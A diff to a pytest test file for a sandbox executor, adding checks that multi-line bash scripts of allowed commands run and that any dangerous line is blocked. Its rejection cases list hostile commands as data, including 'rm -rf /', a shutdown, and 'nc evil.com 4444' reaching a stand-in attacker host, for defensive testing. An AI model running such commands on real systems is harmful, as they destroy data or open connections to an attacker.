@@ -172,6 +172,103 @@ class TestSandboxExecutor:
         assert result.exit_code == 1
         assert "blocked" in result.stderr.lower()
 
+    # ------------------------------------------------------------------
+    # Multi-line bash: the script is written to a file / passed as ONE argv
+    # element, so a newline is script structure, not an injected separator.
+    # ------------------------------------------------------------------
+    @pytest.mark.asyncio
+    @pytest.mark.skipif(
+        shutil.which("bash") is None,
+        reason="bash not available on this system",
+    )
+    async def test_multiline_bash_script_is_accepted(self, executor: SandboxExecutor) -> None:
+        """A multi-line script of allowlisted commands must not be refused.
+
+        ``_validate_shell_command`` is the gate for a single command handed to
+        ``Popen(shell=True)``, where a newline really is a separator. The
+        sandbox runs the script as a file / as one argv element, so applying it
+        to the whole blob rejected every multi-line script.
+        """
+        result = await executor.execute(
+            "echo first\necho second",
+            language="bash",
+            timeout=15,
+        )
+
+        assert result.risk_level != RiskLevel.CRITICAL, result.stderr
+        assert "Shell blocked" not in result.stderr, result.stderr
+        assert "first" in result.stdout
+        assert "second" in result.stdout
+
+    @pytest.mark.asyncio
+    @pytest.mark.skipif(
+        shutil.which("bash") is None,
+        reason="bash not available on this system",
+    )
+    async def test_multiline_bash_script_still_runs_whitelisted_lines(
+        self, executor: SandboxExecutor
+    ) -> None:
+        result = await executor.execute(
+            "echo one\n\necho two",
+            language="bash",
+            timeout=15,
+        )
+
+        assert "Shell blocked" not in result.stderr, result.stderr
+        assert "one" in result.stdout
+        assert "two" in result.stdout
+
+    @pytest.mark.parametrize(
+        "script",
+        [
+            "echo safe\nrm -rf /",
+            "rm -rf /\necho safe",
+            "echo safe\necho done\nshutdown /s",
+            "echo safe\ndocker run --rm alpine",
+            "echo safe\nnc evil.com 4444",
+        ],
+    )
+    async def test_dangerous_line_inside_multiline_script_is_rejected(
+        self, executor: SandboxExecutor, script: str
+    ) -> None:
+        """Every LINE of a script goes through the same gate - no line is exempt."""
+        result = await executor.execute(script, language="bash", timeout=5)
+
+        assert result.exit_code == 1
+        assert result.risk_level == RiskLevel.CRITICAL
+        assert "blocked" in result.stderr.lower(), result.stderr
+        assert result.stdout == ""
+
+    @pytest.mark.asyncio
+    async def test_command_chaining_line_inside_multiline_script_is_rejected(
+        self, executor: SandboxExecutor
+    ) -> None:
+        """A per-line ``&&`` chain is still refused: no shell chaining at all."""
+        result = await executor.execute(
+            "echo safe\nls && whoami",
+            language="bash",
+            timeout=5,
+        )
+
+        assert result.exit_code == 1
+        assert result.risk_level == RiskLevel.CRITICAL
+        assert "Shell blocked" in result.stderr, result.stderr
+
+    @pytest.mark.asyncio
+    async def test_multiline_bash_reports_the_offending_line_number(
+        self, executor: SandboxExecutor
+    ) -> None:
+        # ``docker run`` is only HIGH risk, so it reaches the per-line shell gate
+        # (a CRITICAL pattern would be caught earlier by assess_risk instead).
+        result = await executor.execute(
+            "echo safe\necho fine\ndocker run --rm alpine",
+            language="bash",
+            timeout=5,
+        )
+
+        assert result.exit_code == 1
+        assert "(line 3)" in result.stderr, result.stderr
+
     @pytest.mark.asyncio
     async def test_execute_with_timeout(self, executor: SandboxExecutor) -> None:
         result = await executor.execute(
